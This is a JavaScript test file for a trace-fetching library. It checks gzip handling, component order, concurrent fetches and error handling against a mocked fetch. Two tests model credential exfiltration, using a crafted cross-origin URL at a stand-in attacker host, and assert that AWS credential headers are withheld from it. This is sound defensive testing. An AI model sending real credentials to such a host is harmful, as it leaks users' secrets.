#!/usr/bin/env node
"use strict";

// Tests for fetchTraces: the `trace=` query parameter is repeatable, and each
// component is fetched and gunzipped independently before concatenation.

const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const { assert, testAsync, summarize } = require("./test_harness.js");
const { fetchTraces, fetchTracesStream, parseTrace, parseTraceStream } = require("./trace_parser.js");

// Drain an async iterable of Uint8Array chunks into one contiguous Uint8Array.
async function collectChunks(iterable) {
  const chunks = [];
  let total = 0;
  for await (const c of iterable) {
    const u8 = c instanceof Uint8Array ? c : new Uint8Array(c);
    chunks.push(u8);
    total += u8.length;
  }
  const out = new Uint8Array(total);
  let off = 0;
  for (const c of chunks) { out.set(c, off); off += c.length; }
  return out;
}

// Minimal fetch() mock: maps a URL → bytes (Buffer/Uint8Array) and returns a
// Response-like object exposing arrayBuffer(). Supports an error URL too.
// Records the second (options) argument of each call so tests can assert that
// headers are forwarded.
function installFetchMock(urlToBytes) {
  const original = global.fetch;
  const calls = [];
  global.fetch = async (url, opts) => {
    calls.push({ url, opts });
    if (!(url in urlToBytes)) {
      return { ok: false, status: 404, async arrayBuffer() { return new ArrayBuffer(0); } };
    }
    const bytes = urlToBytes[url];
    const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
    return {
      ok: true,
      status: 200,
      async arrayBuffer() {
        return u8.buffer.slice(u8.byteOffset, u8.byteOffset + u8.byteLength);
      },
    };
  };
  const restore = () => { global.fetch = original; };
  restore.calls = calls;
  return restore;
}

// Normalize to a plain Uint8Array so deepStrictEqual doesn't trip on the
// Buffer-vs-Uint8Array type tag (Node Buffers are Uint8Array subclasses).
function bytesOf(buf) {
  const u8 = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
  return Uint8Array.from(u8);
}

async function main() {
  const tracePath = path.join(__dirname, "demo-trace.bin");
  if (!fs.existsSync(tracePath)) {
    console.error(`Trace file not found: ${tracePath}`);
    process.exit(1);
  }

  const fileBytes = fs.readFileSync(tracePath);
  const rawTrace = fileBytes[0] === 0x1f && fileBytes[1] === 0x8b
    ? zlib.gunzipSync(fileBytes)
    : Buffer.from(fileBytes);
  const gzTrace = zlib.gzipSync(rawTrace);

  // Reference parse of a single raw trace.
  const single = await parseTrace(rawTrace);
  const singleEvents = single.events.length;
  console.log(`Single trace: ${singleEvents} events`);

  // ── Test 1: single raw URL round-trips unchanged ──
  await testAsync("single raw component", async () => {
    const restore = installFetchMock({ "/a": rawTrace });
    try {
      const buf = await fetchTraces("/a");
      assert.deepStrictEqual(bytesOf(buf), bytesOf(rawTrace));
    } finally { restore(); }
  });

  // ── Test 2: single gzipped URL is ungzipped to raw bytes ──
  await testAsync("single gzipped component is ungzipped", async () => {
    const restore = installFetchMock({ "/a.gz": gzTrace });
    try {
      const buf = await fetchTraces(["/a.gz"]);
      assert.deepStrictEqual(bytesOf(buf), bytesOf(rawTrace));
    } finally { restore(); }
  });

  // ── Test 3: mixed gzipped + raw components, each ungzipped individually,
  //    then concatenated in order. The concatenated stream must parse as one
  //    trace with double the events (decoder resets on mid-stream TRC\0). ──
  await testAsync("mixed gzip/raw components concatenate and parse", async () => {
    const restore = installFetchMock({ "/gz": gzTrace, "/raw": rawTrace });
    try {
      const buf = await fetchTraces(["/gz", "/raw"]);
      const expectedLen = rawTrace.length * 2;
      assert.strictEqual(buf.byteLength, expectedLen, "concatenated length");
      // First half == raw trace, second half == raw trace.
      const out = bytesOf(buf);
      assert.deepStrictEqual(out.slice(0, rawTrace.length), bytesOf(rawTrace));
      assert.deepStrictEqual(out.slice(rawTrace.length), bytesOf(rawTrace));

      const parsed = await parseTrace(buf);
      assert.strictEqual(parsed.events.length, singleEvents * 2,
        `expected ${singleEvents * 2} events, got ${parsed.events.length}`);
    } finally { restore(); }
  });

  // ── Test 4: order is preserved ──
  await testAsync("component order is preserved", async () => {
    const a = new Uint8Array([1, 2, 3]);
    const b = new Uint8Array([4, 5]);
    const c = new Uint8Array([6]);
    const restore = installFetchMock({ "/a": a, "/b": b, "/c": c });
    try {
      const buf = await fetchTraces(["/a", "/b", "/c"]);
      assert.deepStrictEqual(bytesOf(buf), new Uint8Array([1, 2, 3, 4, 5, 6]));
    } finally { restore(); }
  });

  // ── Test 5b: opts.headers are forwarded to every fetch (BYO credentials) ──
  await testAsync("headers are forwarded to each fetch", async () => {
    const restore = installFetchMock({ "/a": rawTrace, "/b": rawTrace });
    try {
      const headers = { "x-dial9-aws-access-key-id": "AKIA" };
      await fetchTraces(["/a", "/b"], { headers });
      assert.strictEqual(restore.calls.length, 2, "two fetches issued");
      for (const call of restore.calls) {
        assert.ok(call.opts, "fetch received an options arg");
        assert.deepStrictEqual(call.opts.headers, headers, "headers forwarded");
      }
    } finally { restore(); }
  });

  // ── Test 5c: credential headers are withheld from cross-origin URLs ──
  // A crafted `?trace=https://attacker/` must NOT receive the AWS credential
  // headers, or it would exfiltrate the user's credentials to a foreign host.
  await testAsync("credential headers are withheld from cross-origin URLs", async () => {
    const restore = installFetchMock({
      "/api/trace?keys=seg": rawTrace,
      "https://attacker.example/x": rawTrace,
    });
    // Simulate a browser served from https://dial9.example.
    const originalLocation = global.location;
    global.location = { origin: "https://dial9.example", href: "https://dial9.example/viewer.html" };
    try {
      const headers = { "x-dial9-aws-access-key-id": "AKIA", "x-dial9-aws-secret-access-key": "shh" };
      await fetchTraces(["/api/trace?keys=seg", "https://attacker.example/x"], { headers });
      assert.strictEqual(restore.calls.length, 2, "two fetches issued");

      const sameOrigin = restore.calls.find((c) => c.url === "/api/trace?keys=seg");
      const crossOrigin = restore.calls.find((c) => c.url === "https://attacker.example/x");

      assert.deepStrictEqual(sameOrigin.opts.headers, headers, "same-origin request keeps credentials");
      assert.strictEqual(
        crossOrigin.opts.headers,
        undefined,
        "cross-origin request must NOT carry credential headers"
      );
    } finally {
      restore();
      global.location = originalLocation;
    }
  });

  // ── fetchTracesStream: streams components back-to-back as one trace ──

  // Concatenated stream is byte-identical to the buffered fetchTraces output,
  // and parses (via parseTraceStream) to the same event count.
  await testAsync("fetchTracesStream concatenation matches fetchTraces", async () => {
    const restore = installFetchMock({ "/gz": gzTrace, "/raw": rawTrace });
    try {
      const streamed = await collectChunks(fetchTracesStream(["/gz", "/raw"]));
      const buffered = bytesOf(await fetchTraces(["/gz", "/raw"]));
      assert.deepStrictEqual(streamed, buffered, "streamed bytes == buffered bytes");

      const parsed = await parseTraceStream(fetchTracesStream(["/gz", "/raw"]));
      assert.strictEqual(parsed.events.length, singleEvents * 2,
        `expected ${singleEvents * 2} events, got ${parsed.events.length}`);
    } finally { restore(); }
  });

  // Components are emitted strictly in `urls` order even though the fetches run
  // concurrently (a later, faster component must not jump the queue).
  await testAsync("fetchTracesStream preserves order", async () => {
    const a = new Uint8Array([1, 2, 3]);
    const b = new Uint8Array([4, 5]);
    const c = new Uint8Array([6]);
    const restore = installFetchMock({ "/a": a, "/b": b, "/c": c });
    try {
      const out = await collectChunks(fetchTracesStream(["/a", "/b", "/c"]));
      assert.deepStrictEqual(out, new Uint8Array([1, 2, 3, 4, 5, 6]));
    } finally { restore(); }
  });

  // The whole point of #595: all component fetches are dispatched up front (so
  // downloads run concurrently and overlap the parse), NOT one-after-another as
  // each stream is drained. Calling fetchTracesStream must issue every fetch()
  // synchronously, before any chunk is consumed.
  await testAsync("fetchTracesStream dispatches all fetches concurrently", async () => {
    const restore = installFetchMock({ "/a": rawTrace, "/b": rawTrace, "/c": rawTrace });
    try {
      const iterable = fetchTracesStream(["/a", "/b", "/c"]);
      // No chunk has been consumed yet, but all three fetches should already
      // be in flight (fetchTraceStream calls fetch() synchronously before its
      // first await, and fetchTracesStream maps over all URLs eagerly).
      assert.strictEqual(restore.calls.length, 3,
        `expected 3 concurrent fetches before consuming, got ${restore.calls.length}`);
      // Draining still works after the fact.
      const out = await collectChunks(iterable);
      assert.strictEqual(out.length, rawTrace.length * 3, "all three components drained");
    } finally { restore(); }
  });

  // Credential headers follow the same same-origin rule as fetchTraces.
  await testAsync("fetchTracesStream withholds credentials cross-origin", async () => {
    const restore = installFetchMock({
      "/api/object?key=seg": rawTrace,
      "https://attacker.example/x": rawTrace,
    });
    const originalLocation = global.location;
    global.location = { origin: "https://dial9.example", href: "https://dial9.example/viewer.html" };
    try {
      const headers = { "x-dial9-aws-access-key-id": "AKIA", "x-dial9-aws-secret-access-key": "shh" };
      await collectChunks(fetchTracesStream(["/api/object?key=seg", "https://attacker.example/x"], { headers }));
      const sameOrigin = restore.calls.find((c) => c.url === "/api/object?key=seg");
      const crossOrigin = restore.calls.find((c) => c.url === "https://attacker.example/x");
      assert.deepStrictEqual(sameOrigin.opts.headers, headers, "same-origin keeps credentials");
      assert.strictEqual(crossOrigin.opts.headers, undefined, "cross-origin withholds credentials");
    } finally {
      restore();
      global.location = originalLocation;
    }
  });

  // A later component that fails (e.g. 404) while an earlier one is still
  // resolving must (a) reject the iterator when emission reaches it, and (b) NOT
  // leave a transient unhandled rejection (which fires the browser's
  // `unhandledrejection` event / Node's unhandledRejection). The eager-dispatch
  // design attaches a no-op catch to each fetch promise to prevent (b).
  //
  // The window only opens across a REAL macrotask gap: component 0 must take a
  // timer to resolve so that, while we await it, the microtask queue drains and
  // Node runs its unhandled-rejection check with component 1 still un-awaited.
  // A synchronous one-shot reader would award component 1 within microtasks and
  // mask the bug, so this uses a body whose first read resolves via setTimeout.
  await testAsync("fetchTracesStream: late failure rejects without unhandled rejection", async () => {
    // /slow: streams rawTrace, but its first read lands on a real timer.
    // /late: 404s after one microtask. /slow is index 0, /late is index 1.
    const originalFetch = global.fetch;
    global.fetch = async (url) => {
      if (url === "/late") {
        return { ok: false, status: 404, async arrayBuffer() { return new ArrayBuffer(0); } };
      }
      let sent = false;
      return {
        ok: true,
        status: 200,
        body: {
          getReader() {
            return {
              async read() {
                if (sent) return { done: true, value: undefined };
                sent = true;
                await new Promise((r) => setTimeout(r, 20)); // macrotask gap
                return { done: false, value: rawTrace };
              },
              async cancel() {},
            };
          },
        },
      };
    };
    let unhandled = 0;
    const onUnhandled = () => { unhandled++; };
    process.on("unhandledRejection", onUnhandled);
    try {
      let threw = false;
      try {
        await collectChunks(fetchTracesStream(["/slow", "/late"]));
      } catch (e) {
        threw = true;
        assert.ok(/404/.test(e.message), `error mentions status: ${e.message}`);
      }
      assert.ok(threw, "expected the iterator to reject");
      // Let any stray microtask/macrotask-deferred rejection settle.
      await new Promise((r) => setTimeout(r, 10));
      assert.strictEqual(unhandled, 0, `expected 0 unhandled rejections, got ${unhandled}`);
    } finally {
      global.fetch = originalFetch;
      process.removeListener("unhandledRejection", onUnhandled);
    }
  });

  // ── Test 5: a failed component rejects with an informative error ──
  await testAsync("failed fetch rejects", async () => {
    const restore = installFetchMock({ "/ok": rawTrace });
    try {
      let threw = false;
      try {
        await fetchTraces(["/ok", "/missing"]);
      } catch (e) {
        threw = true;
        assert.ok(/404/.test(e.message), `error mentions status: ${e.message}`);
      }
      assert.ok(threw, "expected fetchTraces to reject");
    } finally { restore(); }
  });

  summarize();
}

main();
